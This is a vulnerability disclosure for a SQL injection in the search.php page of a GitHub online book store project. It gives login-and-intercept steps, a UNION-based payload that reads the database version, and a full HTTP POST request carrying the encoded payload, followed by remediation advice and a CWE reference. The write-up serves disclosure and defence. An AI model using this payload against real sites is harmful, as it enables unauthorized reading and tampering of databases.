# keerti1924 / Online-Book-Store-Website - search.php SQL Injection

## Vendor Homepage:
[Online-Book-Store-Website](https://github.com/keerti1924/Online-Book-Store-Website)

## Impact
The 'search.php' script in keerti1924's Online-Book-Store-Website is vulnerable to SQL Injection, allowing attackers to execute arbitrary SQL commands and gain unauthorized access to the underlying database. This could lead to unauthorized data disclosure, data manipulation, and potential data loss, compromising the confidentiality, integrity, and availability of the system and its data.

## Proof of Concept
Step 1: Login as a normal user\
Step 2: Navigate to the search feature and perform a search query.\
Step 3: Intercept the POST request and inject the following payload into the 'search' parameter: "a' union select 1,@@version,null,null,null,null #".\
Step 4: Submit the request and observe the database version displayed in the search results, confirming successful SQL Injection.\

## HTTP Request Example
``` http request
POST /search.php HTTP/2
Host: [REDACTED]
Cookie: PHPSESSID=[REDACTED]
Content-Length: 97
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

search=a'%20union%20select%201%2c%40%40version%2cnull%2c%20null%2cnull%2cnull%20%23&submit=Submit
```

## Proof with screenshot
![Screenshot](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20Online-Book-Store-Website/SQL%20Injection%20Search/SQL%20Injection%20in%20search.php%20screenshot.png?raw=true0)

## Remidiation
To mitigate this vulnerability, implement parameterized queries or prepared statements to sanitize user input and prevent SQL Injection attacks. Additionally, perform proper input validation and sanitization on user-supplied data before executing SQL queries. Regular security assessments and code reviews should be conducted to identify and address any potential security vulnerabilities in the application.

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)